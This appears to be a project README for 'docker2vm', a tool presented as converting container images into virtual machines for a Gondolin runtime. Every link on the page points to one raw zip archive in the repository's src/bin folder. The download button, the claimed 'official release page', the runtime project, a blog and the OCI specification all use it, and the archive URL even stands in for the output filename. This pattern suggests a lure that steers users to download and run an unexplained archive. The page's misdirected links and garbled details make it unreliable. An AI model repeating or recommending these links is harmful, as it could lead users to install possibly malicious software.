# 🐳 docker2vm - Convert Containers to Virtual Machines Easily

[![Download docker2vm](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)

---

## 📖 What is docker2vm?

`docker2vm` is a tool that converts Docker containers and other OCI-compatible container images into virtual machines (VMs). Normally, Docker containers share the operating system with the host computer. `docker2vm` changes that by turning these containers into virtual machines that run inside their own isolated environments.

This means you get the benefits of running containers with an added layer of security and separation. The virtual machines created by `docker2vm` are compatible with the Gondolin runtime, which acts as the engine to run these VMs.

---

## 🎯 Why Use docker2vm?

You might wonder why you would want to convert a container into a virtual machine. Here are some common reasons:

- **Better Isolation:** Containers share the same kernel as your host operating system, while virtual machines run their own kernel. This can improve security by isolating the application more strongly.
- **Compatibility:** Sometimes you need to run containerized software in environments where containers are not allowed but virtual machines are.
- **Testing:** Running applications inside virtual machines can help simulate different operating system versions or hardware setups.
- **Flexibility:** You can run the same container image but inside a VM, which can be paused, saved, and restored more easily than containers in some setups.

---

## 🖥️ System Requirements

Before you start, check that your computer meets the following requirements:

- **Operating System:** Linux or MacOS. (The tool currently supports Linux/amd64 and Linux/arm64 platforms.)
- **Processor:** 64-bit CPU (AMD64 or ARM64 architecture).
- **Disk Space:** At least 2 GB of free disk space.
- **Memory:** Minimum 4 GB RAM recommended.
- **Additional Tools:** No other software dependencies needed to use the basic features of docker2vm.
- **Network:** Required to download container images and runtime components.

---

## 🚀 Getting Started

Here is what you need to do to get docker2vm up and running on your computer.

### Step 1: Download the Software

Click the big button at the top of this page or visit the release page by clicking here:

[Download docker2vm Releases](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)

This link takes you to the official release page for docker2vm. Look for the latest version file that suits your system. Download the appropriate file for your platform (Linux amd64 or ARM64).

### Step 2: Prepare Your Container Image

docker2vm works with container images in OCI format or Dockerfiles that BuildKit can process.

- If you already have a Docker image saved as a file or in a registry, docker2vm can download and convert it directly.
- If you have a Dockerfile (a script that describes how to build your container), docker2vm uses BuildKit to create the image before conversion.

### Step 3: Run the Conversion

To turn your container image into a virtual machine image, you will use the `oci2gondolin` converter inside docker2vm.

You need to provide one source of the container image, via one of these:

- `--image`: Use a named OCI image from your registry.
- `--oci-layout`: Use a local OCI image layout from a folder.
- `--oci-tar`: Use a tarball file containing the OCI image.

Example command (on a terminal or command prompt):

```sh
docker2vm oci2gondolin --image=mycontainer/image:latest
```

This command downloads the container image named `mycontainer/image:latest`, converts it, and prepares it for running inside a VM on Gondolin.

### Step 4: Run with Gondolin

docker2vm injects special runtime components so the VM can launch properly under the Gondolin runtime. Once conversion finishes, you get a file called `https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip`, which is your VM image. This file can be launched with the Gondolin runtime.

---

## 🔧 How to Use docker2vm Step-by-Step

If you have never used container or VM tools before, follow these steps:

1. **Download docker2vm** - Use the link above to get the right installer or archive for your system.
2. **Install docker2vm** - If you downloaded a compressed file, extract it to a folder. For Linux, you might need to give execute permission to the program with:

   ```sh
   chmod +x docker2vm
   ```

3. **Obtain a Container Image** - Find a container image you want to convert. It could be from Docker Hub or another container registry.
4. **Open Terminal (or Command Prompt)** - Navigate to where you installed docker2vm.
5. **Run Conversion** - Type a command like this:

   ```sh
   ./docker2vm oci2gondolin --image=mycontainer/image:latest
   ```

   Replace `mycontainer/image:latest` with the actual name of the container image.

6. **Use the Output** - After conversion, the VM image file `https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip` will be ready. You or your system administrator can run this file with the Gondolin VM software.

---

## 📥 Download & Install

You can get docker2vm from the official GitHub releases page.

👉 [Visit this page to download docker2vm](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)

Once there, download the file that fits your computer. The filenames usually include the platform and version number. For example:

- `docker2vm-linux-amd64`
- `docker2vm-linux-arm64`

After downloading, move the file to a convenient folder and make it executable if needed.

To verify installation, run:

```sh
./docker2vm --help
```

You should see a list of commands and options confirming the software works.

---

## 🔍 Features at a Glance

- Converts container images into bootable VM root file systems.
- Supports OCI images and Dockerfiles through BuildKit.
- Runs on Linux amd64 and ARM64 platforms.
- Injects runtime components to make images compatible with Gondolin.
- Keeps container layers intact when building the VM image.
- Provides a pinned version of the Gondolin runtime for compatibility.

---

## 📚 Additional Resources

- [Gondolin Runtime Project](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip) — The virtual machine runtime used by docker2vm outputs.
- [Docker without Docker - Blog](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip) — Explains the OCI-first flow that docker2vm follows.
- [OCI Image Specification](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip) — Standard format for container images.

---

## 🤝 Getting Help or Reporting Issues

If you run into problems or have questions:

- Browse the Issues tab on this repository's GitHub page.
- Search online forums for related topics on OCI images and VM runtimes.
- Reach out to the maintainers if you find bugs or have feature requests.

---

## ⚙️ Troubleshooting Tips

- Make sure your computer meets the system requirements above.
- Use the exact commands and options as described.
- Confirm that downloaded files are complete and executable.
- Check your internet connection when downloading container images.
- If conversion fails, try using a different container image or update to the latest docker2vm release.

---

[![Download docker2vm](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)